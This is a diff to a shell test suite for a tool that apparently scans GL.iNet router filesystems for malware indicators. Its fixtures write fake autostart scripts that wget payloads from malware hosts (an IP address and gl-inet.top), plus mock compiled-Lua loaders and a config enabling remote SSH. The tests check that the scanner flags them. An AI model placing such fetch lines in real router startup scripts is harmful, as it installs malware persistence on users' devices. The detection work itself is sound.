@@ -409,7 +409,11 @@ printf '#!/bin/sh\necho hi\n' >"$U/etc/udhcpc.user.d/10-mine"
 printf '#!/bin/sh\n/etc/glinet/.cache/watch.sh &\n' >"$U/etc/init.d/S99w"
 printf '#!/bin/sh\nwget http://66.245.219.252:8000/ni.sh\n' >"$U/etc/hotplug.d/iface/99-x"
 printf '\033Lua junk get_mac_form_proc domain_table\n' >"$U/bin/ulogd"
-printf "config cloud\n\toption enable '1'\n" >"$U/etc/config/gl-cloud"
+printf "config cloud\n\toption enable '1'\n\toption bindtime '1700000000'\n\toption email 'someone@example.org'\n" >"$U/etc/config/gl-cloud"
+printf "config rtty\n\toption ssh_en '1'\n\toption web_en '0'\n" >"$U/etc/config/rtty"
+mkdir -p "$U/usr/lib"; { printf '\033LuaQ'; head -c 1500 /dev/zero | tr '\0' 'x'; printf ' get_mac_form_proc domain_table'; } >"$U/usr/lib/hidden-loader"
+{ printf '\033LuaQ'; head -c 1500 /dev/zero | tr '\0' 'y'; } >"$U/usr/lib/other.luac"; { printf 'text about LuaQ '; head -c 1500 /dev/zero | tr '\0' 'z'; } >"$U/usr/lib/plain.txt"
+printf '#!/bin/sh\nwget http://gl-inet.top:8899/api/v2/sync\n' >"$U/etc/init.d/S98top"
 mkdir -p "$U/usr/lib/opkg"; printf 'Package: gl-sdk4-cloud\nVersion: 1.2.3-4\n\nPackage: other\nVersion: 9\n' >"$U/usr/lib/opkg/status"
 mnt "$D" "$OWO"
 run "$D" "$OWO" --check >"$D/check.txt"; rc=$?
@@ -418,7 +422,10 @@ expect "a script in udhcpc.user.d = REVIEW" 'grep -q "REVIEW  *new  */etc/udhcpc
 expect "an init script that starts watch.sh = IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/init.d/S99w" "$D/check.txt"'
 expect "an autostart file with a server of the malware = IOC persist-ref" 'grep -A1 "IOC  *persist-ref  */etc/hotplug.d/iface/99-x" "$D/check.txt" | grep -q "66.245.219.252"'
 expect "the loader is recognised by its function names" 'grep -A1 "IOC  *backdoor-file  */bin/ulogd" "$D/check.txt" | grep -q "compiled Lua.*function names of the analysed loader"'
-expect "GoodCloud state and client version are printed" 'grep -q "GoodCloud now  *on (gl-sdk4-cloud 1.2.3-4)" "$D/check.txt"'
+expect "GoodCloud state, client version, binding and remote access are printed" 'grep -q "GoodCloud now  *on (gl-sdk4-cloud 1.2.3-4), bound to an account: on, remote SSH: on, remote web: off" "$D/check.txt"'
+expect "the account's address is not printed anywhere" '! grep -q "someone@example" "$D/check.txt"'
+expect "compiled Lua elsewhere in the overlay: the loader by its names is IOC, other bytecode REVIEW" 'grep -q "IOC  *backdoor-file  */usr/lib/hidden-loader" "$D/check.txt" && grep -q "REVIEW  *lua-bytecode  */usr/lib/other.luac" "$D/check.txt" && ! grep -q "lua-bytecode.*plain.txt" "$D/check.txt"'
+expect "gl-inet.top in an autostart file is an indicator" 'grep -A1 "IOC  *persist-ref  */etc/init.d/S98top" "$D/check.txt" | grep -q "gl-inet.top"'
 umount "$D/m"
 
 echo "=== what the installer leaves (topic 73056, post 90)"
